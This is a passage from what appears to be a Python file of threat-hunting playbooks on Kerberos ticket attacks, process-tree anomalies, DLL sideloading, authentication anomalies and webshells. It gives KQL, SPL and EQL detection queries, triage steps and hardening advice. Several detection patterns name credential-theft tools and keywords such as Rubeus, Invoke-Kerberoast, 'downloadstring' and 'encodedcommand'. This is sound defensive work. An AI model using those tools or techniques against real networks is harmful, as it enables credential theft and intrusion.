| Technique ID | Name | Tactic |
|---|---|---|
| T1550.003 | Use Alternate Authentication Material: Pass the Ticket | Lateral Movement |
| T1558.001 | Steal or Forge Kerberos Tickets: Golden Ticket | Credential Access |
| T1558.002 | Steal or Forge Kerberos Tickets: Silver Ticket | Credential Access |
| T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | Credential Access |
| T1550.002 | Use Alternate Authentication Material: Pass the Hash | Lateral Movement |

## Hypothesis

An adversary with stolen NTLM hashes or Kerberos tickets is performing
Overpass-the-Hash, Pass-the-Ticket, Golden Ticket, or Kerberoasting attacks
to authenticate, move laterally, and escalate privileges within the Active
Directory environment without knowing plaintext passwords.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Windows Security | Event 4768 (TGT Request) | TicketEncryptionType, ClientAddress, ServiceName |
| Windows Security | Event 4769 (Service Ticket Request) | ServiceName, TicketEncryptionType, ClientAddress |
| Windows Security | Event 4770 (TGT Renewal) | ClientAddress, ServiceName |
| Windows Security | Event 4771 (Kerberos Pre-Auth Failure) | ClientAddress, FailureCode |
| Windows Security | Event 4624 (Logon) | LogonType, AuthenticationPackageName, KeyLength |
| Network | Kerberos traffic (port 88) | Packet analysis for ticket anomalies |

## Detection Queries

### KQL - Overpass-the-Hash: RC4 TGT Request from Unexpected Host (Elastic)

```kql
event.code: "4768" AND
winlog.event_data.TicketEncryptionType: "0x17" AND
NOT winlog.event_data.IpAddress: ("::1" OR "127.0.0.1") AND
NOT winlog.event_data.TargetUserName: "*$"
```

### KQL - Kerberoasting: Mass Service Ticket Requests (Elastic)

```kql
event.code: "4769" AND
winlog.event_data.TicketEncryptionType: ("0x17" OR "0x18") AND
NOT winlog.event_data.ServiceName: ("krbtgt" OR "*$")
| stats count() as ticket_count, dc(winlog.event_data.ServiceName) as unique_services
  by winlog.event_data.IpAddress, source.ip
| where unique_services > 5
| sort unique_services desc
```

### KQL - Golden Ticket: TGT with Abnormal Lifetime (Elastic)

```kql
event.code: "4769" AND
winlog.event_data.TicketEncryptionType: "0x17" AND
NOT winlog.event_data.IpAddress: ("::1" OR "127.0.0.1")
```

### SPL - Overpass-the-Hash Detection (Splunk)

```spl
index=wineventlog EventCode=4768
| where TicketEncryptionType="0x17"
| where NOT match(TargetUserName, "\$$")
| stats count, values(IpAddress) as source_ips, values(TargetUserName) as users
  by Computer
| where count > 0
| lookup ad_computers.csv ip as source_ips OUTPUT hostname
| table Computer, source_ips, hostname, users, count
```

### SPL - Kerberoasting: Bulk SPN Ticket Requests (Splunk)

```spl
index=wineventlog EventCode=4769
  TicketEncryptionType IN ("0x17", "0x18")
  ServiceName!="krbtgt"
| where NOT match(ServiceName, "\$$")
| bucket _time span=5m
| stats count, dc(ServiceName) as unique_spns,
        values(ServiceName) as services
  by IpAddress, TargetUserName, _time
| where unique_spns > 5
| sort - unique_spns
```

### SPL - Pass-the-Ticket: Logon Without Preceding TGT Request (Splunk)

```spl
index=wineventlog EventCode=4624 LogonType=3
  AuthenticationPackageName="Kerberos"
| join type=left TargetUserName
  [search index=wineventlog EventCode=4768
   | rename TargetUserName as TargetUserName
   | stats latest(_time) as tgt_time by TargetUserName, IpAddress]
| eval time_diff = _time - tgt_time
| where isnull(tgt_time) OR time_diff > 36000
| table _time, Computer, TargetUserName, IpAddress, LogonType, time_diff
```

### SPL - Golden Ticket: Anomalous Domain Field (Splunk)

```spl
index=wineventlog EventCode=4769
| where TargetDomainName != upper(TargetDomainName) OR len(TargetDomainName) < 3
| stats count by TargetUserName, TargetDomainName, ServiceName, IpAddress
| sort - count
```

### EQL - Kerberos Tool Execution (Elastic)

```eql
process where process.name : ("rubeus.exe", "kekeo.exe", "getTGT.exe",
  "getST.exe", "Invoke-Kerberoast.ps1") or
  (process.name == "powershell.exe" and
   process.command_line : ("*Invoke-Kerberoast*", "*Invoke-Rubeus*",
     "*asktgt*", "*asktgs*", "*ptt*", "*golden*", "*silver*"))
```

## Expected Results

- TGT requests (4768) using RC4 encryption (0x17) when the environment uses AES - indicates Overpass-the-Hash
- A single source IP requesting service tickets for many different SPNs within minutes - indicates Kerberoasting
- Kerberos logons (4624) on a host with no preceding TGT request from that source - indicates Pass-the-Ticket
- TGTs with abnormally long lifetimes or unusual domain names - indicates Golden Ticket
- Service tickets with RC4 encryption for services that should use AES - indicates Silver Ticket
- Event 4771 failures with code 0x18 (pre-authentication failure) from multiple accounts from one source

## Triage Steps

1. **Identify the source host**: Map the IpAddress from Kerberos events to a hostname. Determine who was using the host.
2. **Check encryption types**: If the domain enforces AES and you see RC4 requests, this is immediately suspicious.
3. **Correlate with credential access**: Was there LSASS access or credential dumping on the source host prior to the Kerberos anomaly?
4. **For Kerberoasting**: Identify which SPN accounts had tickets requested. Prioritize accounts with weak passwords or high privileges.
5. **For Golden Ticket**: Check the krbtgt password last reset date. If the krbtgt hash was compromised, the attacker has unlimited access.
6. **Examine downstream authentication**: After the Kerberos attack, what resources were accessed? Look for lateral movement events.
7. **Containment**: Reset the krbtgt password twice (with replication between resets) for Golden Ticket. For Kerberoasting, rotate passwords on targeted SPN accounts.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| Legacy systems using RC4 | Inventory known systems that do not support AES; create exclusion list |
| Service account token renewals | Expected patterns; same account, same service, regular intervals |
| Admin tools querying SPNs | IT admin activity correlating with change windows |
| Domain controller replication | Machine accounts (ending in $) are normal |
| Password spray testing | Coordinate with red team; expected source IPs |

## Hardening Recommendations

- Enforce AES encryption for Kerberos (disable RC4 where possible)
- Use Group Managed Service Accounts (gMSA) with automatic password rotation
- Set long, complex passwords on all SPN accounts
- Rotate the krbtgt password every 180 days
- Monitor privileged group membership changes
- Enable Kerberos armoring (FAST) where supported

## References

- SpecterOps: Kerberos Attack Cheat Sheet
- Microsoft: Detecting Credential Theft with Windows Security Events
- Harmj0y: Roasting AS-REPs and Kerberoasting
- Sean Metcalf (ADSecurity.org): Golden Ticket attack mechanics
"""
    ))

    # ---------- Article 11 ----------
    articles.append((
        "Hunting for Suspicious Parent-Child Process Relationships",
        ["threat-hunting", "process-tree", "execution", "defense-evasion", "endpoint", "process-anomaly"],
        r"""# Hunting for Suspicious Parent-Child Process Relationships

## Overview

Every process on a Windows system is spawned by a parent process, creating a
hierarchy that follows predictable patterns in normal operations. Adversaries
break these patterns when they execute payloads through exploits, document
macros, script interpreters, or injected processes. Detecting anomalous
parent-child relationships is one of the most effective endpoint hunting
techniques because it catches a wide range of attack techniques regardless
of the specific malware or tool used.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1059 | Command and Scripting Interpreter | Execution |
| T1204.002 | User Execution: Malicious File | Execution |
| T1055 | Process Injection | Defense Evasion, Privilege Escalation |
| T1036 | Masquerading | Defense Evasion |
| T1218 | System Binary Proxy Execution | Defense Evasion |

## Hypothesis

Adversaries are executing malicious code through unexpected process chains,
such as Office applications spawning command interpreters, web servers spawning
shells, or system processes spawning user-mode tools, indicating exploitation,
macro execution, or process injection.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Sysmon | Event 1 (Process Create) | Image, ParentImage, CommandLine, User, IntegrityLevel |
| Windows Security | Event 4688 (Process Create) | NewProcessName, ParentProcessName, CommandLine |
| EDR | Process telemetry | process tree, ancestry, command_line |

## Detection Queries

### KQL - Office Applications Spawning Interpreters (Elastic)

```kql
process.parent.name: ("WINWORD.EXE" OR "EXCEL.EXE" OR "POWERPNT.EXE" OR "OUTLOOK.EXE" OR "MSACCESS.EXE") AND
process.name: ("cmd.exe" OR "powershell.exe" OR "pwsh.exe" OR "wscript.exe" OR "cscript.exe" OR
               "mshta.exe" OR "rundll32.exe" OR "regsvr32.exe" OR "certutil.exe" OR "bitsadmin.exe")
```

### KQL - System Processes with Unexpected Children (Elastic)

```kql
(process.parent.name: "services.exe" AND NOT process.name: ("svchost.exe" OR "msiexec.exe" OR "wuauclt.exe" OR "spoolsv.exe" OR "taskhost*.exe" OR "SearchIndexer.exe")) OR
(process.parent.name: "svchost.exe" AND process.name: ("cmd.exe" OR "powershell.exe" OR "mshta.exe")) OR
(process.parent.name: "lsass.exe" AND NOT process.name: ("lsaiso.exe"))
```

### KQL - Web Server Spawning Shell (Elastic)

```kql
process.parent.name: ("w3wp.exe" OR "httpd.exe" OR "nginx.exe" OR "apache.exe" OR "tomcat*.exe" OR "java.exe" OR "php-cgi.exe" OR "node.exe") AND
process.name: ("cmd.exe" OR "powershell.exe" OR "bash.exe" OR "sh.exe" OR "whoami.exe" OR "net.exe" OR "net1.exe" OR "systeminfo.exe" OR "ipconfig.exe")
```

### SPL - Suspicious Parent-Child Pairs (Splunk)

```spl
index=sysmon EventCode=1
| eval pair = ParentImage."|".Image
| lookup suspicious_parent_child.csv pair as pair OUTPUT severity, description
| where isnotnull(severity)
| stats count by ParentImage, Image, severity, description, Computer, User, CommandLine
| sort severity, - count

```

### SPL - Unexpected Children of Explorer.exe (Splunk)

```spl
index=sysmon EventCode=1 ParentImage="*\\explorer.exe"
| where match(Image, "(?i)(certutil|bitsadmin|mshta|regsvr32|cmstp|msbuild|installutil)")
  OR match(CommandLine, "(?i)(downloadstring|invoke-expression|iex|encodedcommand|bypass|hidden)")
| stats count by Image, CommandLine, Computer, User
| sort - count
```

### SPL - Script Host Spawning Network-Capable Processes (Splunk)

```spl
index=sysmon EventCode=1
  (ParentImage="*\\wscript.exe" OR ParentImage="*\\cscript.exe")
| where match(Image, "(?i)(powershell|cmd|mshta|rundll32|regsvr32|certutil|bitsadmin|net\.exe)")
| stats count, values(CommandLine) as commands by ParentImage, Image, Computer, User
| sort - count
```

### EQL - Multi-Stage Execution Chain (Elastic)

```eql
sequence by host.id with maxspan=2m
  [process where process.parent.name : ("WINWORD.EXE", "EXCEL.EXE") and
   process.name : ("cmd.exe", "powershell.exe", "wscript.exe")]
  [process where process.name : ("certutil.exe", "bitsadmin.exe", "mshta.exe",
   "rundll32.exe", "regsvr32.exe")]
```

### EQL - WMI Provider Spawning Unexpected Processes (Elastic)

```eql
process where process.parent.name == "WmiPrvSE.exe" and
  process.name : ("cmd.exe", "powershell.exe", "mshta.exe", "rundll32.exe",
    "regsvr32.exe", "cscript.exe", "wscript.exe") and
  not process.args : ("*\\Windows\\CCM\\*", "*SCCM*")
```

## Common Suspicious Parent-Child Relationships

| Parent Process | Suspicious Child | Indicates |
|---|---|---|
| WINWORD.EXE, EXCEL.EXE | cmd.exe, powershell.exe, wscript.exe | Macro execution |
| OUTLOOK.EXE | powershell.exe, mshta.exe | Email-based payload |
| w3wp.exe, httpd.exe | cmd.exe, powershell.exe, whoami.exe | Webshell |
| WmiPrvSE.exe | cmd.exe, powershell.exe | Remote WMI execution |
| svchost.exe | cmd.exe, powershell.exe | Service exploitation |
| services.exe | Unknown binary | Rogue service |
| lsass.exe | Any child process | Highly anomalous |
| explorer.exe | certutil, bitsadmin, mshta | LOLBin abuse from user context |
| wscript.exe, cscript.exe | powershell.exe, cmd.exe | Script-based dropper |
| mshta.exe | powershell.exe, cmd.exe | HTA-based attack |

## Expected Results

- Office applications spawning command interpreters or scripting engines
- Web server processes spawning shells or system reconnaissance commands
- WmiPrvSE.exe spawning non-WMI child processes
- services.exe spawning processes that are not known Windows services
- Script hosts (wscript, cscript) spawning network-capable processes
- lsass.exe spawning any child process (extremely rare in normal operations)
- Processes with command-line arguments containing encoded content, URLs, or bypass flags

## Triage Steps

1. **Examine the full process tree**: Look at grandparent, parent, and child. The full chain reveals the attack flow.
2. **Analyze command-line arguments**: Decode any Base64, examine URLs, identify flags like -hidden or -bypass.
3. **Check the triggering event**: For Office macros, identify the document. For webshells, identify the request.
4. **Verify the binary**: Is the child process the genuine Windows binary, or is it masquerading (wrong path, unsigned)?
5. **Correlate with file events**: Were any files dropped before or after the suspicious process chain?
6. **Check network activity**: Did any process in the chain make outbound connections?
7. **Scope**: Search for the same parent-child pattern across all endpoints to identify the campaign scope.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| Office add-ins and macros | Known enterprise macros; validated VBA code; signed add-ins |
| SCCM/Intune scripts | WmiPrvSE or svchost spawning expected management scripts |
| Scheduled tasks | Expected parent chain through taskeng.exe or taskhostw.exe |
| Development tools | Developers running builds that invoke cmd/powershell from IDEs |
| Antivirus remediation | AV processes spawning cleanup scripts; known AV paths |

Build a lookup table of known-good parent-child pairs for your environment
and use it to filter noise from hunting queries.

## References

- SANS: Hunt Evil Process Relationships Poster
- Elastic: Parent-Child Process Relationship Detection
- Microsoft: Understanding Windows Process Hierarchy
"""
    ))

    # ---------- Article 12 ----------
    articles.append((
        "Hunting for DLL Sideloading and Hijacking",
        ["threat-hunting", "dll-sideloading", "dll-hijacking", "defense-evasion", "persistence", "endpoint"],
        r"""# Hunting for DLL Sideloading and Hijacking

## Overview

DLL sideloading and hijacking exploit the Windows DLL search order to trick
legitimate, often signed, executables into loading a malicious DLL. In
sideloading, the adversary places a malicious DLL alongside a legitimate
executable that imports it by name. In hijacking, the adversary replaces or
intercepts a DLL that a program loads at startup. Both techniques allow
execution of malicious code under the guise of a trusted process, effectively
bypassing application whitelisting and digital signature validation.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1574.001 | Hijack Execution Flow: DLL Search Order Hijacking | Persistence, Privilege Escalation, Defense Evasion |
| T1574.002 | Hijack Execution Flow: DLL Side-Loading | Persistence, Privilege Escalation, Defense Evasion |
| T1574.006 | Hijack Execution Flow: Dynamic Linker Hijacking | Persistence (Linux) |
| T1036.005 | Masquerading: Match Legitimate Name or Location | Defense Evasion |

## Hypothesis

Adversaries are abusing DLL search order behaviour to load malicious DLLs via
legitimate signed executables, allowing them to execute code within a trusted
process context to evade application control, EDR detection, and analyst
scrutiny.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Sysmon | Event 7 (Image Load) | ImageLoaded, Image, Signed, SignatureStatus |
| Sysmon | Event 1 (Process Create) | process.executable, working_directory |
| Sysmon | Event 11 (File Create) | TargetFilename, Image |
| EDR | DLL load telemetry | loaded_dll, loading_process, dll_path, dll_signature |
| File Integrity | FIM alerts | file_path, hash_change, modification_time |

## Detection Queries

### KQL - Unsigned DLL Loaded by Signed Process (Elastic)

```kql
event.code: "7" AND
winlog.event_data.Signed: "true" AND
winlog.event_data.SignatureStatus: "Valid" AND
winlog.event_data.ImageLoaded: NOT (*\\Windows\\System32\\* OR *\\Windows\\SysWOW64\\* OR *\\Windows\\WinSxS\\*) AND
NOT winlog.event_data.ImageLoadedSigned: "true"
```

### KQL - Known Sideload Targets Loading DLLs from Non-Standard Paths (Elastic)

```kql
process.name: ("OneDrive.exe" OR "Teams.exe" OR "vmtoolsd.exe" OR "Spotify.exe" OR
               "GoogleUpdate.exe" OR "MicrosoftEdgeUpdate.exe" OR "7zFM.exe" OR
               "WinSCP.exe" OR "notepad++.exe") AND
event.code: "7" AND
NOT dll.path: (*\\Program Files\\* OR *\\Program Files (x86)\\* OR *\\Windows\\*)
```

### KQL - DLL Written to Executable Directory (Elastic)

```kql
event.category: "file" AND event.action: "creation" AND
file.extension: "dll" AND
NOT file.path: (*\\Windows\\* OR *\\Program Files\\* OR *\\Program Files (x86)\\*) AND
file.path: (*\\Temp\\* OR *\\AppData\\* OR *\\ProgramData\\* OR *\\Public\\* OR *\\Downloads\\*)
```

### SPL - DLL Sideloading: DLL Loaded from Same Directory as Executable (Splunk)

```spl
index=sysmon EventCode=7
| rex field=Image "^(?<exe_dir>.+)\\\\[^\\\\]+$"
| rex field=ImageLoaded "^(?<dll_dir>.+)\\\\[^\\\\]+$"
| where exe_dir == dll_dir
| where NOT match(exe_dir, "(?i)(\\\\windows\\\\|\\\\program files)")
| where NOT match(ImageLoaded, "(?i)(\\\\windows\\\\|\\\\program files)")
| rex field=ImageLoaded "\\\\(?<dll_name>[^\\\\]+)$"
| stats count, values(Image) as exe_loading, values(ImageLoaded) as dll_loaded
  by exe_dir, dll_name, Computer
| sort - count
```

### SPL - Suspicious DLL Names in Writable Directories (Splunk)

```spl
index=sysmon EventCode=7
| rex field=ImageLoaded "\\\\(?<dll_name>[^\\\\]+\.dll)$"
| where match(dll_name, "(?i)(version\.dll|dbghelp\.dll|winhttp\.dll|wtsapi32\.dll|crypt32\.dll|cryptbase\.dll|MSASN1\.dll|netapi32\.dll|profapi\.dll|secur32\.dll|wbemcomn\.dll)")
| where NOT match(ImageLoaded, "(?i)(\\\\windows\\\\system32|\\\\windows\\\\syswow64|\\\\windows\\\\winsxs)")
| stats count by Image, ImageLoaded, Signed, SignatureStatus, Computer
| sort - count
```

### SPL - Known Vulnerable Executables for Sideloading (Splunk)

```spl
index=sysmon EventCode=1
| where match(Image, "(?i)(\\\\temp\\\\|\\\\appdata\\\\|\\\\programdata\\\\|\\\\public\\\\)")
| rex field=Image "\\\\(?<exe_name>[^\\\\]+)$"
| lookup sideload_targets.csv exe_name as exe_name OUTPUT expected_path, expected_dll
| where isnotnull(expected_path)
| where NOT match(Image, expected_path)
| stats count by exe_name, Image, ParentImage, Computer
| sort - count
```

### EQL - DLL Sideload Execution Pattern (Elastic)

```eql
sequence by host.id with maxspan=5m
  [file where event.action == "creation" and
   file.extension == "dll" and
   not file.path : ("?:\\Windows\\*", "?:\\Program Files*")]
  [library where
   not dll.path : ("?:\\Windows\\*", "?:\\Program Files*") and
   process.code_signature.trusted == true]
```

### EQL - Process Running from Unusual Location (Elastic)

```eql
process where process.code_signature.trusted == true and
  not process.executable : (
    "?:\\Windows\\*",
    "?:\\Program Files\\*",
    "?:\\Program Files (x86)\\*"
  ) and
  process.executable : (
    "?:\\Users\\*\\AppData\\*",
    "?:\\Users\\*\\Downloads\\*",
    "?:\\Temp\\*",
    "?:\\ProgramData\\*"
  )
```

## Commonly Sideloaded DLL Names

| DLL Name | Commonly Abused By | Notes |
|---|---|---|
| version.dll | Many legitimate apps | Extremely common sideload target |
| dbghelp.dll | Development tools | Frequently sideloaded by APT groups |
| winhttp.dll | Many apps with HTTP | Network functionality replacement |
| cryptbase.dll | Various system tools | Crypto operations interception |
| wtsapi32.dll | Remote Desktop tools | Session enumeration |
| profapi.dll | User profile tools | Profile loading interception |
| MSASN1.dll | Certificate tools | Certificate parsing interception |
| secur32.dll | Authentication tools | Credential interception potential |

## Expected Results

- Signed legitimate executables loading unsigned DLLs from the same directory
- Known sideload target executables running from Temp, AppData, or Downloads
- DLLs with names matching system libraries loaded from non-System32 paths
- File creation events showing DLLs dropped alongside legitimate executables
- Legitimate executables copied to writable directories before execution
- Common sideload DLL names (version.dll, dbghelp.dll, winhttp.dll) in unexpected locations

## Triage Steps

1. **Verify the DLL**: Check the hash and signature of the loaded DLL. Unsigned DLLs loaded by signed processes are suspicious.
2. **Compare to the legitimate DLL**: Does a legitimate version exist in System32? Compare file sizes and exports.
3. **Check the executable location**: Why is a signed executable running from Temp, AppData, or Downloads instead of Program Files?
4. **Analyze the DLL**: Submit to sandbox for dynamic analysis. Check imports and exports for malicious functionality.
5. **Identify the dropper**: How did the executable and DLL arrive in the directory? Check file creation events and download history.
6. **Check for persistence**: Is the sideloaded pair configured to run on startup via service, scheduled task, or Run key?
7. **Scope the attack**: Search for the same DLL hash or the same exe+dll naming pattern across all endpoints.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| Portable applications | Known portable apps (PortableApps.com); consistent paths per user |
| Development environments | DLLs in build output directories; developer workstations |
| Self-contained deployments | .NET or Electron apps bundling their own DLLs; consistent across installs |
| Software with private DLL directories | Application-specific DLLs in the app directory; signed by same vendor |
| Windows Store apps | AppX/MSIX paths; Microsoft-signed container |

## References

- Mandiant: DLL Search Order Hijacking
- Fireeye: DLL Sideloading Exposed
- MITRE ATT&CK: Hijack Execution Flow
- KnownDLLs: List of protected system DLLs immune to hijacking
"""
    ))

    # ---------- Article 13 ----------
    articles.append((
        "Hunting for Anomalous Authentication Patterns",
        ["threat-hunting", "authentication", "brute-force", "credential-access", "identity", "lateral-movement"],
        r"""# Hunting for Anomalous Authentication Patterns

## Overview

Authentication logs are a goldmine for threat hunting. Adversaries who have
stolen credentials, cracked password hashes, or purchased access on dark
markets generate authentication anomalies that deviate from the user's normal
behaviour. This playbook covers hunting for brute force attacks, password
spraying, impossible travel, off-hours access, service account abuse, and
anomalous logon types across both on-premises Active Directory and cloud
identity providers.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1110.001 | Brute Force: Password Guessing | Credential Access |
| T1110.003 | Brute Force: Password Spraying | Credential Access |
| T1078 | Valid Accounts | Defense Evasion, Persistence, Initial Access |
| T1078.004 | Valid Accounts: Cloud Accounts | Initial Access |
| T1550 | Use Alternate Authentication Material | Lateral Movement |

## Hypothesis

Adversaries are using stolen, sprayed, or brute-forced credentials to
authenticate to systems and services, generating patterns such as failed
logon bursts, authentication from unusual locations, logons at atypical times,
or a single account authenticating to an abnormal number of systems.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Windows Security | Event 4624/4625/4648 | TargetUserName, LogonType, IpAddress, FailureReason |
| Azure AD / Entra ID | Sign-in logs | userPrincipalName, ipAddress, location, riskLevel, appDisplayName |
| VPN | Authentication logs | username, source_ip, geo_location, timestamp |
| RADIUS/TACACS | Network auth logs | username, NAS_IP, auth_result |
| MFA | MFA challenge logs | username, factor_type, result, push_accepted_from |
| Linux | /var/log/auth.log, sshd | username, source_ip, auth_method |

## Detection Queries

### KQL - Password Spraying: Many Users, Few Failures Per User (Elastic)

```kql
event.code: "4625" AND
winlog.event_data.SubStatus: "0xC000006A"
| stats count() as failures, dc(winlog.event_data.TargetUserName) as unique_users
  by source.ip
| where unique_users > 10 AND failures / unique_users < 3
| sort unique_users desc
```

### KQL - Brute Force: Many Failures Then Success (Elastic)

```kql
(event.code: "4625" OR event.code: "4624") AND
NOT user.name: ("*$" OR "ANONYMOUS LOGON")
| stats count(event.code == "4625") as failures,
        count(event.code == "4624") as successes
  by source.ip, user.name
| where failures > 20 AND successes > 0
| sort failures desc
```

### KQL - Azure AD Risky Sign-In (Elastic)

```kql
event.dataset: "azure.signinlogs" AND
(azure.signinlogs.properties.risk_level_during_signin: ("high" OR "medium") OR
 azure.signinlogs.properties.risk_state: "atRisk")
```

### SPL - Password Spraying Detection (Splunk)

```spl
index=wineventlog EventCode=4625 SubStatus=0xC000006A
| bucket _time span=15m
| stats dc(TargetUserName) as unique_users,
        count as total_failures,
        values(TargetUserName) as targeted_users
  by IpAddress, _time
| where unique_users > 10
| eval spray_ratio = round(total_failures / unique_users, 2)
| where spray_ratio < 3
| sort - unique_users
```

### SPL - Impossible Travel (Splunk)

```spl
index=vpn OR index=azure_ad action=success
| iplocation src_ip
| sort 0 _time
| streamstats current=f last(_time) as prev_time,
        last(City) as prev_city,
        last(Country) as prev_country,
        last(lat) as prev_lat,
        last(lon) as prev_lon
  by user
| eval time_diff_hours = (_time - prev_time) / 3600
| eval distance_km = 6371 * acos(
    sin(prev_lat * pi() / 180) * sin(lat * pi() / 180) +
    cos(prev_lat * pi() / 180) * cos(lat * pi() / 180) *
    cos((lon - prev_lon) * pi() / 180))
| eval required_speed_kmh = distance_km / time_diff_hours
| where required_speed_kmh > 900 AND time_diff_hours < 24
| table _time, user, prev_city, prev_country, City, Country, time_diff_hours, distance_km, required_speed_kmh
```

### SPL - Service Account Used Interactively (Splunk)

```spl
index=wineventlog EventCode=4624
  (TargetUserName="svc_*" OR TargetUserName="sa_*" OR TargetUserName="app_*")
  LogonType IN (2, 10, 11)
| stats count, values(WorkstationName) as workstations,
        values(IpAddress) as source_ips,
        values(LogonType) as logon_types
  by TargetUserName
| sort - count
```

### SPL - Off-Hours Authentication (Splunk)

```spl
index=wineventlog EventCode=4624 LogonType IN (2, 10)
| eval hour = strftime(_time, "%H")
| eval day = strftime(_time, "%u")
| where (hour < 6 OR hour > 22) OR day > 5
| where NOT match(TargetUserName, "(?i)(svc_|sa_|admin_backup)")
| stats count, values(WorkstationName) as workstations
  by TargetUserName, IpAddress
| where count > 0
| sort - count
```

### EQL - Failed Authentication Burst Followed by Success (Elastic)

```eql
sequence by winlog.event_data.TargetUserName, source.ip with maxspan=10m
  [authentication where event.code == "4625"] with runs=5
  [authentication where event.code == "4624"]
```

## Expected Results

- Single source IP failing authentication against many different usernames with the same error (password spraying)
- High failure count followed by a success for the same user from the same IP (brute force)
- User authenticating from two geographically distant locations within a timeframe that makes physical travel impossible
- Service accounts performing interactive (Type 2) or RDP (Type 10) logons
- Logons occurring at unusual hours for the user's established pattern
- Azure AD sign-ins flagged as risky by Microsoft Identity Protection
- Accounts authenticating to an unusually high number of systems in a short period

## Triage Steps

1. **Identify the account**: Is it a user account, service account, or admin account? What is its privilege level?
2. **Geolocate the source**: Where is the source IP? Does it match the user's known locations?
3. **Check MFA status**: Was MFA challenged and passed? MFA bypass or fatigue attacks are increasingly common.
4. **Review post-authentication activity**: What did the account do after successful logon? Look for data access, lateral movement, persistence.
5. **Contact the user**: For impossible travel or off-hours access, verify with the user whether they were the one authenticating.
6. **Check for token theft**: For cloud identity, look for sign-ins that bypass MFA by replaying stolen session tokens.
7. **Assess scope**: Are other accounts being targeted from the same source? Is this part of a larger spray campaign?

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| VPN or proxy aggregation | Same IP for many users; known VPN egress IPs |
| Mobile users traveling | Verify with user; travel within reasonable speed |
| Automated scripts with wrong creds | Service accounts; same failure pattern daily; stale password |
| IT admin activities | Expected from admin workstations during maintenance windows |
| Cloud app token refresh | Same device, same app; no location change |

## References

- Microsoft: Investigating Risky Sign-Ins in Azure AD
- SANS: Detecting Password Spray Attacks
- CrowdStrike: Credential-Based Attack Detection
"""
    ))

    # ---------- Article 14 ----------
    articles.append((
        "Hunting for Webshell Activity on Web Servers",
        ["threat-hunting", "webshell", "web-server", "persistence", "initial-access", "endpoint"],
        r"""# Hunting for Webshell Activity on Web Servers

## Overview

Webshells are server-side scripts (ASPX, JSP, PHP, Python) that provide
adversaries with remote access to web servers. After exploiting a web
application vulnerability or uploading a malicious file, attackers deploy
webshells that persist across reboots and provide command execution, file
management, and pivoting capabilities. Webshells are used by both APT groups
and ransomware operators as an initial foothold and persistence mechanism.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1505.003 | Server Software Component: Web Shell | Persistence |
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Execution |
| T1083 | File and Directory Discovery | Discovery |
| T1505 | Server Software Component | Persistence |

## Hypothesis

An adversary has deployed one or more webshells on web servers in the
environment, either through exploitation of a web application vulnerability
or by leveraging compromised credentials to upload malicious server-side
scripts, which are now being used for command execution and further network
penetration.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Web Server | IIS, Apache, Nginx access logs | uri, method, status_code, user_agent, response_size |
| Sysmon | Event 1 (Process Create) | ParentImage w3wp.exe/httpd, Image, CommandLine |
| Sysmon | Event 11 (File Create) | TargetFilename in web directories |
| File Integrity | FIM alerts | file_path, hash, modification_time |
| Network | Firewall, proxy | outbound connections from web server IPs |
| EDR | Process telemetry | process tree originating from web server process |

## Detection Queries

### KQL - Web Server Process Spawning Commands (Elastic)

```kql
process.parent.name: ("w3wp.exe" OR "httpd.exe" OR "nginx.exe" OR "apache2" OR
                       "tomcat*.exe" OR "java.exe" OR "php-cgi.exe") AND
process.name: ("cmd.exe" OR "powershell.exe" OR "pwsh.exe" OR "whoami.exe" OR
               "net.exe" OR "net1.exe" OR "ipconfig.exe" OR "systeminfo.exe" OR
               "tasklist.exe" OR "quser.exe" OR "netstat.exe" OR "ping.exe" OR
               "certutil.exe" OR "bitsadmin.exe")
```

### KQL - New File Created in Web Root (Elastic)

```kql
event.category: "file" AND event.action: "creation" AND
file.extension: ("aspx" OR "asp" OR "jsp" OR "jspx" OR "php" OR "cfm" OR "py") AND
file.path: (*\\inetpub\\* OR *\\wwwroot\\* OR *\\htdocs\\* OR *\\webapps\\* OR
            */var/www/* OR */opt/tomcat/*)
```

### KQL - Suspicious Web Requests to New or Rare URIs (Elastic)

```kql
url.path: (*.aspx OR *.asp OR *.jsp OR *.php) AND
http.response.status_code: 200 AND
NOT url.path: (*login* OR *default* OR *index* OR *home*)
| stats count() as requests, dc(source.ip) as unique_sources by url.path
| where requests < 20 AND unique_sources <= 2
```

### SPL - Webshell Process Chain Detection (Splunk)

```spl
index=sysmon EventCode=1
  (ParentImage="*\\w3wp.exe" OR ParentImage="*\\httpd.exe" OR
   ParentImage="*\\tomcat*.exe" OR ParentImage="*\\java.exe" OR
   ParentImage="*\\php-cgi.exe" OR ParentImage="*\\nginx.exe")
| where match(Image, "(?i)(cmd\.exe|powershell|whoami|net\.exe|net1\.exe|ipconfig|systeminfo|tasklist|quser|netstat|certutil|bitsadmin)")
| stats count, values(CommandLine) as commands, values(User) as users
  by ParentImage, Image, Computer
| sort - count
```

### SPL - Anomalous File Writes to Web Directories (Splunk)

```spl
index=sysmon EventCode=11
| where match(TargetFilename, "(?i)(\\\\inetpub\\\\|\\\\wwwroot\\\\|\\\\htdocs\\\\|\\\\webapps\\\\|/var/www/)")
| where match(TargetFilename, "(?i)\.(aspx|asp|jsp|jspx|php|cfm|py|ashx|asmx|shtml)$")
| where NOT match(Image, "(?i)(msiexec|TrustedInstaller|w3wp\.exe|setup|deploy)")
| stats count by Image, TargetFilename, Computer
| sort - count
```

### SPL - POST Requests to Rarely Accessed Pages (Splunk)

```spl
index=iis OR index=apache cs_method=POST
| where match(cs_uri_stem, "(?i)\.(aspx|asp|jsp|php)$")
| stats count, dc(c_ip) as unique_ips,
        avg(sc_bytes) as avg_response,
